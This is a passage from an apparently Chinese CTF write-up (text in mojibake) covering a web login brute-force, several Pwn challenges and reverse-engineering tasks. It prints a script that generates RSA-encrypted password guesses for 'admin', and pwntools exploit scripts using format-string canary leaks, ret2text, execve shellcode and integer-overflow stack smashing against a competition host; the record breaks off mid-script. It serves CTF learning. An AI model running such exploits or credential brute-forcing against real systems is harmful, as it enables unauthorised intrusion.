class="params">_0x1626c4</span>) &#123;</span><br><span class="line">            coco[<span class="string">&#x27;alert&#x27;</span>](&#123;</span><br><span class="line">                <span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;é»æ„®ãš&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;text&#x27;</span>: _0x1626c4</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">if</span> (_0x326c0f[<span class="string">&#x27;DTeqY&#x27;</span>](_0x1626c4, <span class="string">&#x27;ç™»å½•æˆåŠŸ&#x27;</span>)) &#123;</span><br><span class="line">                _0x326c0f[<span class="string">&#x27;IeKGb&#x27;</span>](<span class="built_in">setTimeout</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                    location[<span class="string">&#x27;reload&#x27;</span>]();</span><br><span class="line">                &#125;, <span class="number">0x3e8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);;</span><br><span class="line">_0xod5 = <span class="string">&#x27;jsjiami.com.v6&#x27;</span></span><br></pre></td></tr></table></figure><p>åˆ†æå‘ç°ï¼Œå‰ç«¯è¾“å…¥çš„è´¦å·å¯†ç ï¼Œä»¥ <code>username|-|password</code> çš„æ–¹å¼ç»„åˆåï¼Œå†ç»RSAåŠ å¯†å¾—åˆ°base64å¯†æ–‡ã€‚</p><p>ç”Ÿæˆçˆ†ç ´ç”¨å­—å…¸ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5 <span class="keyword">as</span> Cipher_pkcs1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;dict.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">public_key = <span class="string">&#x27;&#x27;&#x27;-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQD6US5bbJ7JrsKYeSa8goPJQBgU</span></span><br><span class="line"><span class="string">WXdNyUxtPfcwuCrsYEcWNdnk1fpIdSfUvrku39fYl+h1ciyanp5H79uSzuqsUrPE</span></span><br><span class="line"><span class="string">Hzb2y+GTqdmNzZ53JPcxrFlYMv3NX0EOk3qMzgcSV/qXcAc+fWxLSTV5OVeWV8Lr</span></span><br><span class="line"><span class="string">KJVXPMuQVgrw/SxkBQIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">10000</span>)):</span><br><span class="line">password = <span class="built_in">str</span>(i)</span><br><span class="line">m = <span class="string">&#x27;admin|-|&#x27;</span> + password</span><br><span class="line">rsakey = RSA.importKey(public_key)</span><br><span class="line">cipher = Cipher_pkcs1_v1_5.new(rsakey)</span><br><span class="line">cipher_text = base64.b64encode(cipher.encrypt(m))</span><br><span class="line">f.write(cipher_text+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æœ€åä¸ŠBurpsuiteï¼ŒåŠ è½½æ–°å­—å…¸dict.txtï¼Œçˆ†ç ´æ‹¿åˆ°flagã€‚</p><p>â€‹    </p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="# Pwn"></a># Pwn</h2><h3 id="fo"><a href="#fo" class="headerlink" title="fo"></a>fo</h3><p>å…³é”®ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  speaking();</span><br><span class="line">  leak();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">speaking</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(</span><br><span class="line">           <span class="string">&quot;Do you know the format string?\n&quot;</span></span><br><span class="line">           <span class="string">&quot;           you can message at here:\n&quot;</span></span><br><span class="line">           <span class="string">&quot;            https://wiki.x10sec.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">leak</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">88</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;I heared that you are interested in the CTF.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;           I hope that you will hold on to keep your interest\n&quot;</span></span><br><span class="line">    <span class="string">&quot;          tell me,will you?&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">80</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I will remember what you said&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wait for your good news...&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>checksecå‘ç°å­˜åœ¨canaryï¼Œåˆ©ç”¨<code>leak()</code> ä¸­å­˜åœ¨çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²canaryï¼Œå†å®ç°ret2textã€‚</p><p>Payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">38793</span>)</span><br><span class="line"></span><br><span class="line">[r.recvline() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;%17$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">canary = <span class="built_in">int</span>(r.recvline().strip()[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">backdoor_addr = <span class="number">0x40080D</span></span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x60</span>-<span class="number">8</span>)+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(backdoor_addr)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"><span class="built_in">print</span>(r.recvall())</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h3><p>å…³é”®ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know the ShellCode?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n\n\n---------^-^----------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;show me your Migic&quot;</span>);</span><br><span class="line">  read_shell_code();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Have you finished?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;~Bye&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">read_shell_code</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x5A</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>read_shell_code()</code> å°†è¾“å…¥çš„shellcodeå†™å…¥bssæ®µ <code>buf</code> åŒºåŸŸï¼Œå†é€šè¿‡ <code>read()</code> å®ç°ret2shellcodeã€‚</p><p>Payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">34717</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;show me your Migic\n&#x27;</span>)</span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;mov rbx,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov rax,0x3b</span></span><br><span class="line"><span class="string">syscall&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line"></span><br><span class="line">r.send(shellcode)</span><br><span class="line">r.recvline()</span><br><span class="line">bss_addr = <span class="number">0x601080</span></span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(<span class="number">0x601080</span>)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="magic-int"><a href="#magic-int" class="headerlink" title="magic_int"></a>magic_int</h3><p>å…³é”®ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  __isoc99_scanf(&amp;unk_400959, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = -v4;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">      EDG();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 <span class="title function_">EDG</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> gets(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cä¸­intå–å€¼èŒƒå›´ä¸º -2147483648 ~ +2147483647ï¼Œè€Œ -2147483648 åˆšå¥½ä¸ºå–åå‘ç”Ÿä¸Šæº¢çš„æ•°ï¼Œä¼ å…¥å³å¯è¿›å…¥ <code>EDG()</code>ï¼Œå†ret2textã€‚</p><p>Payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">38780</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x400781</span></span><br><span class="line">r.send(<span class="string">&#x27;-2147483648\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">pay = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x77</span> + p64(backdoor)</span><br><span class="line">r.send(pay)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="magic-abs"><a href="#magic-abs" class="headerlink" title="magic_abs"></a>magic_abs</h3><p>å…³é”®ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-84h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">92</span>]; <span class="comment">// [rsp+10h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+6Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">time_t</span> timer; <span class="comment">// [rsp+70h] [rbp-20h] BYREF</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+78h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// [rsp+80h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+84h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// [rsp+8Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  v3 = time(&amp;timer);</span><br><span class="line">  srand(v3);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  v11 = read(<span class="number">0</span>, s, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Tell me your a g e:&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your lucky number?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">  v10 = abs32(v5);</span><br><span class="line">  v9 = (<span class="type">int</span>)(v10 + v11);</span><br><span class="line">  v12 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v9 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    s[<span class="number">10</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hi,%s And see you next time!\n&quot;</span>, s);</span><br><span class="line">    v12 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Recording...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">    v13 = rand() % (((<span class="type">int</span>)abs32(v5 + v7) &gt;&gt; v7) + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v13 = rand() % <span class="number">10000</span>;</span><br><span class="line">  record(s, v5, v13, v12);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">record</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">unsigned</span> <span class="type">int</span> a2, <span class="type">unsigned</span> <span class="type">int</span> a3, <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n name: %s \n lucky number: %d \n tag: %d\n DOWN!\n&quot;</span>, a1, a2, a3);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( a4 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcpy</span>(&amp;dest[a3], a1, v4);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcpy</span>(dest, a1, v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ„é€  <code>v7</code> å’Œ <code>v5</code>ï¼Œä½¿å¾— <code>(((int)abs32(v5 + v7) &gt;&gt; v7) + 1)</code> ä¸º1ï¼Œ<code>v13</code> ä¸å†éšæœºåªèƒ½å–0ï¼Œåœ¨ <code>record()</code> ä¸­ï¼Œè¾“å…¥çš„ <code>s</code> ä½œä¸ºpayloadå¤åˆ¶åˆ° <code>dest</code> åŒºåŸŸï¼Œé€ æˆæ ˆæº¢å‡ºã€‚</p><p>æœ¬åœ°æµ‹è¯•ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v5 = <span class="number">-2147483647</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,(<span class="type">int</span>)v5); <span class="comment">//-2147483647</span></span><br><span class="line">    <span class="type">int</span> v7 = <span class="number">2147483647</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,((<span class="type">int</span>)(v5+v7))&gt;&gt;v7); <span class="comment">//0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">36236</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line">backdoor_addr = <span class="number">0x4009D7</span></span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(backdoor_addr)</span><br><span class="line">r.send(pl)</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line">r.sendline(<span class="string">&#x27;2147483647&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line">r.sendline(<span class="string">&#x27;-2147483647&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="# Reverse"></a># Reverse</h2><h3 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h3><blockquote><p>ç¨‹åºæµç¨‹è¯†åˆ«ï¼Œç®—æ³•é€†å‘</p></blockquote><p><code>login()</code> ä¸­ <code>pqsd`fl&#123;zmpZsag&#125;wdYVkUNC</code> ä¸ <code>0x16</code> å¼‚æˆ–å¾—åˆ° <code>fgervpzml&#123;fLewqkarO@&#125;CXU</code>ï¼Œå†8ä½ä¸€ç»„ä¸Šä¸‹æ’åˆ—ï¼Œä»ä¸Šå¾€ä¸‹å–å‡ºè¿æˆï¼š<code>flag&#123;refOrL@ve&#125;pwCzqXmkU</code>ã€‚</p><p>flagï¼š<code>flag&#123;refOrL@ve&#125;</code></p><p>â€‹    </p><h3 id="rejunk"><a href="#rejunk" class="headerlink" title="rejunk"></a>rejunk</h3><blockquote><p>åƒåœ¾ä»£ç æ··æ·†ï¼Œå¼‚æˆ–ç®—æ³•é€†å‘</p></blockquote><p>æŸ¥çœ‹ä¼ªä»£ç å‘ç°å¤¹è¿›å¾ˆå¤šåƒåœ¾ä»£ç ï¼Œè·Ÿè¿›å‡ è¡Œæœ‰ç”¨çš„ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__main();</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;input your answer:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v14);</span><br><span class="line"><span class="built_in">sprintf</span>(Buffer, <span class="string">&quot;%s%s%s%s&quot;</span>, <span class="string">&quot;WQGUL&quot;</span>, <span class="string">&quot;xb&gt;2:&quot;</span>, <span class="string">&quot;ooh95=&quot;</span>, <span class="string">&quot;&#x27;&#x27;twk&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( (v9 ^ (v14[v9] + <span class="number">2</span>)) != Buffer[v9] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>è„šæœ¬é€†è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">list</span>(<span class="string">b&#x27;&#x27;&#x27;WQGULxb&gt;2:ooh95=&#x27;&#x27;twk&#x27;&#x27;&#x27;</span>)</span><br><span class="line">t = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    t.append((s[i]^i)-<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span 